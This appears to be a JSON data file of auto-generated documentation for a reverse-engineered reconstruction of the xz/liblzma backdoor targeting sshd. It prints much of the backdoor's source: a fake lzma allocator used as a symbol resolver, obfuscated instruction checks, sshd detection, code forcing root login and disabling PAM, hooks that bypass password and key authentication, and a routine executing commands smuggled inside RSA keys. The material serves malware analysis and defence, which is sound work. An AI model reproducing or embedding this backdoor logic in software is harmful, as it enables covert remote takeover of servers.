  "init_elf_entry_ctx": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief initialises the elf_entry_ctx_t\n\n  stores the address of the symbol cpuid_random_symbol in elf_entry_ctx_t::symbol_ptr\n  stores the return address of the function that called the IFUNC resolver which is a stack address in ld.so\n  calls update_got_offset() to update elf_entry_ctx_t::got_offset\n  calls update_cpuid_got_index() to update @ref elf_entry_ctx_t.got_ctx.cpuid_fn\n\n  @param ctx\n\nUpstream implementation excerpt (xzre/xzre_code/init_elf_entry_ctx.c):\n    void init_elf_entry_ctx(elf_entry_ctx_t *ctx){\n    \tctx->symbol_ptr = (void *)&cpuid_random_symbol;\n    \tctx->got_ctx.return_address = (void *)ctx->frame_address[3];\n    \tupdate_got_offset(ctx);\n    \tupdate_cpuid_got_index(ctx);\n    \tctx->got_ctx.got_ptr = NULL;\n    }",
  "init_hooks_ctx": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief Initializes the structure with hooks-related data\n\n  Grabs the call addresses of the internal functions that will be installed into the hook locations.\n\n  @param funcs\n  @return int",
  "init_imported_funcs": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief Initializes the imported_funcs structure\n\n  @param funcs the imported_funcs structure\n  @return BOOL TRUE if successful, FALSE otherwise (if the resolve count is incorrect)",
  "init_ldso_ctx": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief initializes/resets ldso data\n\n  @param ldso_ctx",
  "init_shared_globals": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief Initializes the backdoor_shared_globals structure\n\n  @param shared_globals the backdoor_shared_globals structure\n  @return int returns 0 on success, or 5 if @p shared_globals was NULL",
  "is_endbr64_instruction": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief Checks if the code between @p code_start and @p code_end is an endbr64 instruction.\n\n\n  the checks is encoded as following (note: An endbr64 instruction is encoded as <code>F3 0F 1E FA</code>)\n  @code\n  // as 32bit quantities, so 0x10000f223 -> f223\n  (0xFA1E0FF3 + (0xE230 | 0x5E20000)) == 0xF223\n  @endcode\n  and 0xE230 is always passed as an argument to prevent compiler optimizations and for further obfuscation.\n\n  @param code_start pointer to the first byte of the instruction to test\n  @param code_end pointer to the last byte of the instruction to test\n  @param low_mask_part the constant 0xE230\n  @return BOOL TRUE if the instruction is an endbr64, FALSE otherwise\n\nUpstream implementation excerpt (xzre/xzre_code/is_endbr64_instruction.c):\n    BOOL is_endbr64_instruction(u8 *code_start, u8 *code_end, u32 low_mask_part){\n    \tif((code_end - code_start) > 3){\n    \t\treturn *code_start + (low_mask_part | 0x5E20000) == 0xF223;\n    \t}\n    \treturn FALSE;\n    }",
  "is_gnu_relro": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief checks if the provided identifiers represent a `PT_GNU_RELRO`\n\n  @param p_type program header type\n  @param addend constant `0xA0000000`\n  @return BOOL TRUE if the supplied pt_type is `PT_GNU_RELRO`, FALSE otherwise",
  "is_range_mapped": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief verify if a memory range is mapped\n\n  @param addr the start address\n  @param length the length of the range to check\n  @param ctx a structure with a libc_import_t field at offset 0x10\n  @return BOOL TRUE if the whole range is mapped, FALSE otherwise",
  "j_tls_get_addr": "AutoDoc: Generated from reverse engineering.\n\nSummary:\n  Thin wrapper around the imported __tls_get_addr resolver so the loader can patch the GOT entry while still reaching the original implementation.",
  "key_hash": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/key_hash.c):\n    BOOL rsa_key_hash(\n    \tconst RSA *rsa,\n    \tu8 *mdBuf,\n    \tu64 mdBufSize,\n    \timported_funcs_t *funcs\n    ){\n    \tu8 buf[0x100A] = {0};\n    \tu64 written = 0, expSize = 0;\n    \tconst BIGNUM *n = NULL, *e = NULL;\n    \tBOOL result = (TRUE\n    \t\t&& funcs && rsa && funcs->RSA_get0_key\n    \t\t&& (funcs->RSA_get0_key(rsa, &n, &e, NULL), e != NULL && n != NULL)\n    \t\t// get bytes of 'e'\n    \t\t&& bignum_serialize(buf, sizeof(buf), &written, e, funcs)\n    \t\t&& (expSize = written, written <= 0x1009)\n    \t\t// get bytes of 'n'\n    \t\t&& bignum_serialize(buf + written, sizeof(buf) - written, &written, n, funcs)\n    \t\t&& written + expSize <= sizeof(buf)\n    \t\t// hash e+n\n    \t\t&& sha256(buf, written + expSize, mdBuf, mdBufSize, funcs)\n    \t);\n    \treturn result;\n    }",
  "lea_instruction": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/lea_instruction.c):\n    BOOL find_lea_instruction(u8 *code_start, u8 *code_end, u64 displacement){\n    \n    \tif(!secret_data_append_from_call_site(\n    \t\t(secret_data_shift_cursor_t){ 0x7C }, \n    \t\t5, 6, 0)\n    \t){\n    \t\treturn FALSE;\n    \t}\n    \tdasm_ctx_t dctx = {0};\n    \tfor(;code_start < code_end; ++code_start){\n    \t\tif(x86_dasm(&dctx, code_start, code_end)\n    \t\t\t&& XZDASM_OPC(dctx.opcode) == X86_OPCODE_LEA\n    \t\t\t&& (dctx.flags2 & DF2_FLAGS_MEM) == DF2_MEM_DISP\n    \t\t\t&& (dctx.mem_disp == displacement || dctx.mem_disp == -displacement)\n    \t\t){\n    \t\t\treturn TRUE;\n    \t\t}\n    \t}\n    \treturn FALSE;\n    }",
  "libc_imports": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/libc_imports.c):\n    BOOL resolve_libc_imports(\n    \tstruct link_map *libc,\n    \telf_info_t *libc_info,\n    \tlibc_imports_t *imports\n    ){\n    \tlzma_allocator *resolver = get_lzma_allocator();\n    \tif(!elf_parse((Elf64_Ehdr *)libc->l_addr, libc_info)){\n    \t\treturn FALSE;\n    \t}\n    \tresolver->opaque = libc_info;\n    \timports->read = lzma_alloc(STR_read, resolver);\n    \tif(imports->read)\n    \t\t++imports->resolved_imports_count;\n    \timports->__errno_location = lzma_alloc(STR_errno_location, resolver);\n    \tif(imports->__errno_location)\n    \t\t++imports->resolved_imports_count;\n    \t\n    \treturn imports->resolved_imports_count == 2;\n    }",
  "lzma_alloc": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief lzma_alloc function, used by the backdoor as an ELF symbol resolver\n  the @p allocator 's opaque field must point to a parsed @ref elf_info_t\n\n  @param size the encoded string ID of the function to resolve\n  @param allocator the fake lzma allocator referring to the @ref elf_info_t to search into.\n\nUpstream implementation excerpt (xzre/xzre_code/lzma_alloc.c):\n    void *fake_lzma_alloc(void *opaque, size_t nmemb, size_t size){\n    \telf_info_t *elf_info = (elf_info_t *)opaque;\n    \tEncodedStringId string_id = (EncodedStringId)size;\n    \treturn elf_symbol_get_addr(elf_info, string_id);\n    }",
  "lzma_allocator": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/lzma_allocator.c):\n    lzma_allocator *get_lzma_allocator(void){\n    \treturn &get_lzma_allocator_address()->allocator;\n    }",
  "lzma_check_init": "AutoDoc: Generated from reverse engineering.\n\nSummary:\n  Stub for liblzma's lzma_check_init() that intentionally traps via halt_baddata(); the real implementation lives in the host process and must be resolved through relocation.\n\nNotes:\n  - Exists so the object exports a symbol with the right signature while still ensuring execution never reaches the incomplete clone.\n  - The loader patches this slot with the genuine routine when linking against liblzma.",
  "lzma_free": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/lzma_free.c):\n    void fake_lzma_free(void *opaque, void *ptr){}",
  "main_elf_parse": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief Parses the main executable from the provided structure.\n  As part of the process the arguments and environment is checked.\n\n  The main_elf_t::dynamic_linker_ehdr is set in backdoor_setup() by an interesting trick where the address of __tls_get_addr()\n  is found via GOT in update_got_address(). Then a backwards search for the ELF header magic bytes from this address is\n  performed to find the ld.so ELF header.\n\n  The function will succeed if the checks outlined in @ref process_is_sshd (invoked by this function) are successful.\n\n  @param main_elf The main executable to parse.\n  @return BOOL TRUE if successful and all checks passed, or FALSE otherwise.\n\nUpstream implementation excerpt (xzre/xzre_code/main_elf_parse.c):\n    BOOL main_elf_parse(main_elf_t *main_elf){\n    \tif(!elf_parse(\n    \t\tmain_elf->dynamic_linker_ehdr,\n    \t\tmain_elf->elf_handles->dynamic_linker\n    \t)){\n    \t\treturn FALSE;\n    \t}\n    \tElf64_Sym *libc_stack_end_sym;\n    \tif(!(libc_stack_end_sym = elf_symbol_get(\n    \t\tmain_elf->elf_handles->dynamic_linker,\n    \t\tSTR_libc_stack_end,\n    \t\tSTR_GLIBC_2_2_5\n    \t))){\n    \t\treturn FALSE;\n    \t}\n    \telf_info_t *dynamic_linker = main_elf->elf_handles->dynamic_linker;\n    \tvoid **libc_stack_end_ptr = (void *)PTRADD(dynamic_linker->elfbase, libc_stack_end_sym->st_value);\n    \tif(!process_is_sshd(dynamic_linker, *libc_stack_end_ptr)){\n    \t\treturn FALSE;\n    \t}\n    \t*main_elf->__libc_stack_end = *libc_stack_end_ptr;\n    \treturn TRUE;\n    }",
  "memmove": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/memmove.c):\n    void *c_memmove(char *dest, char *src, size_t cnt) {\n        if ((src < dest) && (dest < (src + cnt))) {\n            size_t curr = cnt - 1;\n            if (cnt != 0) {\n                do {\n                    *(dest + curr) = *(src + curr);\n                    --curr;\n                } while (curr != -1);\n                return dest;\n            }\n        } else {\n            if (cnt == 0)\n                return dest;\n            size_t curr = 0;\n            do {\n                *(dest + curr) = *(src + curr);\n                ++curr;\n            } while (cnt != curr);\n        }\n        return dest;\n    }",
  "mm_answer_authpassword_hook": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief used to bypass password authentication by replying with a successful `MONITOR_ANS_AUTHPASSWORD`\n\n  @param ssh\n  @param sock\n  @param m\n  @return int",
  "mm_answer_keyallowed_hook": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief runs the payload received from @ref sshd_proxy_elevate,\n  and then runs the original `mm_answer_keyallowed` function\n\n  @param ssh\n  @param sock\n  @param m\n  @return int",
  "mm_answer_keyverify_hook": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief used in conjunction with @ref mm_answer_keyallowed_hook to bypass the key validity check\n\n  @param ssh\n  @param sock\n  @param m\n  @return int",
  "mm_log_handler_hook": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief\n\n  @param level\n  @param forced\n  @param msg\n  @param ctx",
  "parse": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/parse.c):\n    #ifndef DT_RELRSZ\n    #define DT_RELRSZ 35 /* Total size of RELR relative relocations * /\n    #endif\n    \n    #ifndef DT_RELR\n    #define DT_RELR\t36 /* Address of RELR relative relocations * /\n    #endif\n    \n    BOOL elf_parse(Elf64_Ehdr *ehdr, elf_info_t *elf_info){\n    \tif(!ehdr || !elf_info){\n    \t\treturn FALSE;\n    \t}\n    \n    \tmemset(elf_info, 0x00, sizeof(*elf_info));\n    \telf_info->elfbase = ehdr;\n    \telf_info->phdrs = (Elf64_Phdr *)PTRADD(ehdr, ehdr->e_phoff);\n    \tint i; Elf64_Phdr *phdr;\n    \tu64 first_vaddr = -1;\n    \tint dynamic_idx = -1;\n    \tfor(i=0, phdr = elf_info->phdrs; i<ehdr->e_phnum; i++, phdr++){\n    \t\tif(phdr->p_type == PT_LOAD){\n    \t\t\tif(phdr->p_vaddr < first_vaddr){\n    \t\t\t\tfirst_vaddr = phdr->p_vaddr;\n    \t\t\t}\n    \t\t} else if(phdr->p_type == PT_DYNAMIC){\n    \t\t\tdynamic_idx = i;\n    \t\t} else if(is_gnu_relro(phdr->p_type, 0xA0000000)){\n    \t\t\tif(elf_info->gnurelro_found){\n    \t\t\t\treturn FALSE;\n    \t\t\t}\n    \t\t\telf_info->gnurelro_vaddr = phdr->p_vaddr;\n    \t\t\telf_info->gnurelro_found = TRUE;\n    \t\t\telf_info->gnurelro_memsize = phdr->p_memsz;\n    \t\t}\n    \t}\n    \tif(first_vaddr == -1 || dynamic_idx == -1){\n    \t\treturn FALSE;\n    \t}\n    \telf_info->first_vaddr = first_vaddr;\n    \t\n    \tElf64_Phdr *dyn_phdr = &elf_info->phdrs[dynamic_idx];\n    \tElf64_Dyn *dyn = (Elf64_Dyn *)PTRADD(ehdr, PTRDIFF(dyn_phdr->p_vaddr, first_vaddr));\n    \telf_info->dyn = dyn;\n    \telf_info->dyn_num_entries = dyn_phdr->p_memsz / sizeof(Elf64_Dyn);\n    \tif(!elf_contains_vaddr(elf_info, dyn, dyn_phdr->p_memsz, PF_R)){\n    \t\treturn FALSE;\n    \t}\n    \n    \tgnu_hash_table_t *gnu_hash = NULL;\n    \n    \tu64 d_pltrelsz = -1;\n    \tu64 d_relasz = -1;\n    \tu64 d_relrsz = -1;\n    \tBOOL have_verdef_num = FALSE;\n    \n    \tfor(i=0; i<elf_info->dyn_num_entries; i++, dyn++){\n    \t\tif(dyn->d_tag == DT_NULL){\n    \t\t\telf_info->dyn_num_entries = i;\n    \t\t\tbreak;\n    \t\t}\n    \t\tswitch(dyn->d_tag){\n    \t\t\tcase DT_JMPREL:\n    \t\t\t\telf_info->plt_relocs = (Elf64_Rela *)dyn->d_un.d_ptr;\n    \t\t\t\tbreak;\n    \t\t\tcase DT_BIND_NOW:\n    \t\t\t\telf_info->flags |= X_ELF_NOW;\n    \t\t\t\tbreak;\n    \t\t\tcase DT_FLAGS:\n    \t\t\t\tif((dyn->d_un.d_val & DF_BIND_NOW) != 0){\n    \t\t\t\t\telf_info->flags |= X_ELF_NOW;\n    \t\t\t\t}\n    \t\t\t\tbreak;\n    \t\t\tcase DT_RELRSZ:\n    \t\t\t\td_relrsz = dyn->d_un.d_val;\n    \t\t\t\tbreak;\n    \t\t\tcase DT_RELR:\n    \t\t\t\telf_info->relr_relocs = (Elf64_Relr *)dyn->d_un.d_ptr;\n    \t\t\t\tbreak;\n    \t\t\tcase DT_PLTRELSZ:\n    \t\t\t\td_pltrelsz = dyn->d_un.d_val;\n    \t\t\t\tbreak;\n    \t\t\tcase DT_STRTAB:\n    \t\t\t\telf_info->strtab = (char *)dyn->d_un.d_ptr;\n    \t\t\t\tbreak;\n    \t\t\tcase DT_SYMTAB:\n    \t\t\t\telf_info->symtab = (Elf64_Sym *)dyn->d_un.d_ptr;\n    \t\t\t\tbreak;\n    \t\t\tcase DT_RELA:\n    \t\t\t\telf_info->rela_relocs = (Elf64_Rela *)dyn->d_un.d_ptr;\n    \t\t\t\tbreak;\n    \t\t\tcase DT_RELASZ:\n    \t\t\t\td_relasz = dyn->d_un.d_val;\n    \t\t\t\tbreak;\n    \t\t\tcase DT_FLAGS_1:\n    \t\t\t\tif((dyn->d_un.d_val & DF_1_NOW) != 0){\n    \t\t\t\t\telf_info->flags |= X_ELF_NOW;\n    \t\t\t\t}\n    \t\t\t\tbreak;\n    \t\t\tcase DT_VERDEFNUM:\n    \t\t\t\telf_info->verdef_num = dyn->d_un.d_val;\n    \t\t\t\tbreak;\n    \t\t\tcase DT_HIPROC:\n    \t\t\t\treturn FALSE;\n    \t\t\tcase DT_VERDEF:\n    \t\t\t\thave_verdef_num = TRUE;\n    \t\t\t\telf_info->verdef = (Elf64_Verdef *)dyn->d_un.d_ptr;\n    \t\t\t\tbreak;\n    \t\t\tcase DT_VERSYM:\n    \t\t\t\telf_info->flags |= X_ELF_VERSYM;\n    \t\t\t\telf_info->versym = (Elf64_Versym *)dyn->d_un.d_ptr;\n    \t\t\t\tbreak;\n    \t\t\tcase DT_GNU_HASH:\n    \t\t\t\tgnu_hash = (gnu_hash_table_t *)dyn->d_un.d_ptr;\n    \t\t\t\tbreak;\n    \t\t\tdefault:\n    \t\t\t\tif(dyn->d_tag > DT_CONFIG){\n    \t\t\t\t\treturn FALSE;\n    \t\t\t\t}\n    \t\t\t\tbreak;\n    \t\t}\n    ...",
  "patch_variables": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/patch_variables.c):\n    BOOL sshd_patch_variables(\n    \tBOOL skip_root_patch,\n    \tBOOL disable_pam,\n    \tBOOL replace_monitor_reqtype,\n    \tint monitor_reqtype,\n    \tglobal_context_t *global_ctx\n    ){\n    \tif(!global_ctx){\n    \t\treturn FALSE;\n    \t}\n    \tsshd_ctx_t *sshd_ctx = global_ctx->sshd_ctx;\n    \tif(!sshd_ctx){\n    \t\treturn FALSE;\n    \t}\n    \tif(!sshd_ctx->have_mm_answer_authpassword\n        || !sshd_ctx->mm_answer_authpassword_hook\n    \t){\n    \t\treturn FALSE;\n    \t}\n    \n    \tif(!skip_root_patch){\n    \t\tint *permit_root_login = sshd_ctx->permit_root_login_ptr;\n    \t\tif(!permit_root_login){\n    \t\t\treturn FALSE;\n    \t\t}\n    \t\tif(*permit_root_login < 0\n    \t\t|| (*permit_root_login > PERMIT_NO_PASSWD && *permit_root_login != PERMIT_YES)){\n    \t\t\treturn FALSE;\n    \t\t}\n    \t\t*permit_root_login = PERMIT_YES;\n    \t}\n    \n    \tif(disable_pam){\n    \t\tint *use_pam = sshd_ctx->use_pam_ptr;\n    \t\tif(!use_pam || *use_pam > TRUE){\n    \t\t\treturn FALSE;\n    \t\t}\n    \t\t*use_pam = FALSE;\n    \t}\n    \n    \tsshd_monitor_func_t *mm_answer_authpassword_ptr = sshd_ctx->mm_answer_authpassword_ptr;\n    \n    \tif(!replace_monitor_reqtype){\n    \t\t// read reqtype from `monitor` struct\n    \t\tmonitor_reqtype = *(int *)PTRDIFF(mm_answer_authpassword_ptr, 8) + 1;\n    \t}\n    \tsshd_ctx->monitor_reqtype_authpassword = monitor_reqtype;\n    \t// install authpassword hook\n    \t*mm_answer_authpassword_ptr = sshd_ctx->mm_answer_authpassword_hook;\n    \treturn TRUE;\n    }",
  "payload_message": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/payload_message.c):\n    BOOL decrypt_payload_message(\n    \tkey_payload_t *payload,\n    \tsize_t payload_size,\n    \tglobal_context_t *ctx\n    ){\n    \tbackdoor_payload_hdr_t hdr = {0};\n    \tu8 output[ED448_KEY_SIZE] = {0};\n    \n    \tmemcpy(&hdr, payload, sizeof(hdr));\n    \n    \tif(!payload){\n    \t\tif(!ctx) return FALSE;\n    \t\tgoto set_state_reset;\n    \t}\n    \n    \tconst size_t header_size = sizeof(payload->hdr) + sizeof(payload->body_length);\n    \tstatic_assert(header_size == 18);\n    \n    \tdo {\n    \t\tif(!ctx) break;\n    \t\tif(ctx->payload_state == 3) return TRUE;\n    \t\tif(payload_size <= header_size || ctx->payload_state > 1) break;\n    \n    \t\t/** decrypt body_size and body * /\n    \t\tif(!chacha_decrypt(\n    \t\t\tpayload->data + sizeof(payload->hdr),\n    \t\t\tpayload_size - sizeof(payload->hdr),\n    \t\t\toutput,\n    \t\t\tpayload->hdr.bytes,\n    \t\t\tpayload->data + sizeof(payload->hdr),\n    \t\t\tctx->imported_funcs)) break;\n    \n    \t\tu16 body_length = payload->body_length;\n    \t\t// body cannot be bigger than remaining length\n    \t\tif(body_length >= payload_size - header_size){\n    \t\t\tbreak;\n    \t\t}\n    \t\t\n    \t\t// body cannot be bigger than the current data size\n    \t\tif(body_length >= ctx->payload_data_size - ctx->current_data_size){\n    \t\t\tbreak;\n    \t\t}\n    \n    \t\t/** keep a copy of the last payload body * /\n    \t\tu8 *data = &ctx->payload_data[ctx->current_data_size];\n    \t\t__builtin_memcpy(data, payload->body, body_length);\n    \t\tctx->current_data_size += body_length;\n    \n    \t\t/** decrypt body * /\n    \t\tif(!chacha_decrypt(\n    \t\t\tpayload->data + sizeof(payload->hdr),\n    \t\t\tpayload_size - sizeof(payload->hdr),\n    \t\t\toutput,\n    \t\t\tpayload->hdr.bytes,\n    \t\t\tpayload->data + sizeof(payload->hdr),\n    \t\t\tctx->imported_funcs\n    \t\t)) break;\n    \n    \t\treturn TRUE;\n    \t} while(0);\n    \n    \tset_state_reset:\n    \tctx->payload_state = PAYLOAD_STATE_INITIAL;\n    \n    \treturn FALSE;\n    }",
  "pointers": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/pointers.c):\n    BOOL count_pointers(\n    \tvoid **ptrs,\n    \tu64 *count_out, \n    \tlibc_imports_t *funcs\n    ){\n    \tif(!ptrs) return FALSE;\n    \tif(!funcs) return FALSE;\n    \tif(!funcs->malloc_usable_size) return FALSE;\n    \tsize_t blockSize = funcs->malloc_usable_size(ptrs);\n    \tif(blockSize - 8 > 127) return FALSE;\n    \tsize_t nWords = blockSize >> 3;\n    \t\n    \tsize_t i;\n    \tfor(i=0; i < nWords && ptrs[i]; ++i);\n    \t*count_out = i;\n    \treturn TRUE;\n    }",
  "process_is_sshd": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief checks if the current process is sshd by inspecting `argv` and `envp`.\n\n  this is done by reading the top of the process stack ( represented by @p stack_end )\n\n  The following checks are performed:\n  - that argv[0] is \"/usr/sbin/sshd\"\n  - the remaining args all start with '-'\n  - the args do not contain the '-d' or '-D' flags (which set sshd into debug or non-daemon mode)\n  - that there is not any '\\\\t' or '=' characters in the args\n  - the environment variable strings do not start with any string from the encoded string table\n\n  In particular these environment strings:\n  - \"DISPLAY=\"\n  - \"LD_AUDIT=\"\n  - \"LD_BIND_NOT=\"\n  - \"LD_DEBUG=\"\n  - \"LD_PROFILE=\"\n  - \"LD_USE_LOAD_BIAS=\"\n  - \"LINES=\"\n  - \"TERM=\"\n  - \"WAYLAND_DISPLAY=\"\n  - \"yolAbejyiejuvnup=Evjtgvsh5okmkAvj\"\n\n  @param elf the main ELF context\n  @param stack_end pointer to the top of the process stack, also known as `__libc_stack_end`\n  @return BOOL TRUE if the process is `sshd`, FALSE otherwise",
  "process_shared_libraries": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief scans loaded libraries to identify interesting libraries\n\n  @param data input data for the function (will be duplicated, internally)\n  @return BOOL TRUE if successful, FALSE otherwise",
  "process_shared_libraries_map": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief scans loaded libraries to identify interesting libraries and populate related data\n\n  @param r_map the linked list of loaded libraries obtained from `r_debug`\n  @param data pointer to data that will be populated by the function\n  @return BOOL TRUE if successful, FALSE otherwise",
  "resolve_libc_imports": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief parses the libc ELF from the supplied link map, and resolves its imports\n\n  @param libc the loaded libc's link map (obtained by traversing r_debug->r_map)\n  @param libc_info pointer to an ELF context that will be populated with the parsed ELF information\n  @param imports pointer to libc imports that will be populated with resolved libc function pointers\n  @return BOOL TRUE if successful, FALSE otherwise\n\nUpstream implementation excerpt (xzre/xzre_code/resolve_libc_imports.c):\n    BOOL resolve_libc_imports(\n    \tstruct link_map *libc,\n    \telf_info_t *libc_info,\n    \tlibc_imports_t *imports\n    ){\n    \tlzma_allocator *resolver = get_lzma_allocator();\n    \tif(!elf_parse((Elf64_Ehdr *)libc->l_addr, libc_info)){\n    \t\treturn FALSE;\n    \t}\n    \tresolver->opaque = libc_info;\n    \timports->read = lzma_alloc(STR_read, resolver);\n    \tif(imports->read)\n    \t\t++imports->resolved_imports_count;\n    \timports->__errno_location = lzma_alloc(STR_errno_location, resolver);\n    \tif(imports->__errno_location)\n    \t\t++imports->resolved_imports_count;\n    \t\n    \treturn imports->resolved_imports_count == 2;\n    }",
  "rsa_key_hash": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief obtains a SHA256 hash of the supplied RSA key\n\n  @param rsa the RSA key to hash\n  @param mdBuf buffer to write the resulting digest to\n  @param mdBufSize size of the buffer indicated by @p mdBuf\n  @param funcs\n  @return BOOL TRUE if the hash was successfully generated, FALSE otherwise\n\nUpstream implementation excerpt (xzre/xzre_code/rsa_key_hash.c):\n    BOOL rsa_key_hash(\n    \tconst RSA *rsa,\n    \tu8 *mdBuf,\n    \tu64 mdBufSize,\n    \timported_funcs_t *funcs\n    ){\n    \tu8 buf[0x100A] = {0};\n    \tu64 written = 0, expSize = 0;\n    \tconst BIGNUM *n = NULL, *e = NULL;\n    \tBOOL result = (TRUE\n    \t\t&& funcs && rsa && funcs->RSA_get0_key\n    \t\t&& (funcs->RSA_get0_key(rsa, &n, &e, NULL), e != NULL && n != NULL)\n    \t\t// get bytes of 'e'\n    \t\t&& bignum_serialize(buf, sizeof(buf), &written, e, funcs)\n    \t\t&& (expSize = written, written <= 0x1009)\n    \t\t// get bytes of 'n'\n    \t\t&& bignum_serialize(buf + written, sizeof(buf) - written, &written, n, funcs)\n    \t\t&& written + expSize <= sizeof(buf)\n    \t\t// hash e+n\n    \t\t&& sha256(buf, written + expSize, mdBuf, mdBufSize, funcs)\n    \t);\n    \treturn result;\n    }",
  "run_backdoor_commands": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief checks if the supplied RSA public key contains the backdoor commands, and executes them if present.\n\n  this function is called from function hooks. the output parameter @p do_orig\n  will indicate to the caller if the original function should be invoked or not\n\n  @param key the public RSA key to check\n  @param ctx the global context, used for the secret data (chacha key)\n  @param do_orig output variable. will contain TRUE if the original function should be invoked, FALSE otherwise.\n  @return BOOL TRUE if backdoor commands were invoked, FALSE otherwise\n\nUpstream implementation excerpt (xzre/xzre_code/run_backdoor_commands.c):\n    #warning \"this function is WIP / needs validation\"\n    \n    /**\n     * Copyright (C) 2024 Stefano Moioli <smxdev4@gmail.com>\n     ** /\n    #include \"xzre.h\"\n    #include <assert.h>\n    #include <openssl/bn.h>\n    #include <string.h>\n    #include <sys/select.h>\n    #include <sys/types.h>\n    #include <time.h>\n    #include <errno.h>\n    \n    #define MONITOR_REQ_KEYALLOWED 22\n    \n    #define SIZE_STEP0 (sizeof(backdoor_payload_hdr_t))\n    #define SIZE_STEP1 (SIZE_STEP0 + ED448_SIGNATURE_SIZE)\n    #define SIZE_STEP2 (SIZE_STEP1 + sizeof(cmd_arguments_t))\n    #define SIZE_HEADERS SIZE_STEP2\n    #define SIZE_SYSTEM_EXTRA (sizeof(uid_t) + sizeof(gid_t))\n    \n    // $FIXME: move to xzre.h\n    extern BOOL sshd_set_log_handler(cmd_arguments_t *args, global_context_t *ctx);\n    \n    BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){\n    \trun_backdoor_commands_data_t f = {0};\n    \tf.p_do_orig = do_orig;\n    \n    \tif(!ctx){\n    \t\texit_early:\n    \t\tif(!do_orig){\n    \t\t\treturn FALSE;\n    \t\t}\n    \t\tgoto exit;\n    \t} else if(ctx->disable_backdoor\n    \t\t|| !rsa\n    \t\t|| !ctx->imported_funcs\n    \t\t|| !ctx->imported_funcs->RSA_get0_key\n    \t\t|| !ctx->imported_funcs->BN_bn2bin\n    \t){\n    \t\tctx->disable_backdoor = TRUE;\n    \t\tgoto exit_early;\n    \t}\n    \n    \tif(do_orig){\n    \t\tdo {\n    \t\t\t*f.p_do_orig = TRUE;\n    \t\t\n    \t\t\tctx->imported_funcs->RSA_get0_key(\n    \t\t\t\trsa, &f.kctx.rsa_n, &f.kctx.rsa_e, NULL);\n    \t\t\tif(!f.kctx.rsa_n || !f.kctx.rsa_e) break;\n    \t\t\tif(!ctx->imported_funcs) break;\n    \t\t\tif(!ctx->imported_funcs->BN_num_bits) break;\n    \t\t\t\n    \t\t\tint num_n_bits = ctx->imported_funcs->BN_num_bits(f.kctx.rsa_n);\n    \t\t\tif(num_n_bits > 0x4000) break;\n    \t\t\t\n    \t\t\tint num_n_bytes = X_BN_num_bytes(num_n_bits);\n    \t\t\tif(num_n_bytes > 536) break;\n    \t\t\t\n    \t\t\tint rsa_n_length = ctx->imported_funcs->BN_bn2bin(f.kctx.rsa_n, (u8 *)&f.kctx.payload);\n    \t\t\tif(rsa_n_length < 0) break;\n    \t\t\tif(num_n_bytes < rsa_n_length) break;\n    \n    \t\t\tif(rsa_n_length <= sizeof(backdoor_payload_hdr_t)) goto exit;\n    \t\t\t// `field_a` cannot be 0\n    \t\t\tif(!f.kctx.payload.header.field_a) goto exit;\n    \t\t\t// `field_b` cannot be 0\n    \t\t\tif(!f.kctx.payload.header.field_b) goto exit;\n    \n    \t\t\tu64 cmd_type = f.kctx.payload.header.field_c + (f.kctx.payload.header.field_b * f.kctx.payload.header.field_a);\n    \t\t\tif(cmd_type > 3) goto exit;\n    \n    \t\t\tif(!ctx->libc_imports) break;\n    \t\t\tif(!ctx->libc_imports->getuid) break;\n    \t\t\tif(!ctx->libc_imports->exit) break;\n    \t\t\tif(!ctx->sshd_log_ctx) break;\n    \t\t\tif(ctx->num_shifted_bits != ED448_KEY_SIZE * 8) break;\n    \t\t\t*(backdoor_payload_hdr_t *)f.kctx.ivec = f.kctx.payload.header;\n    ...",
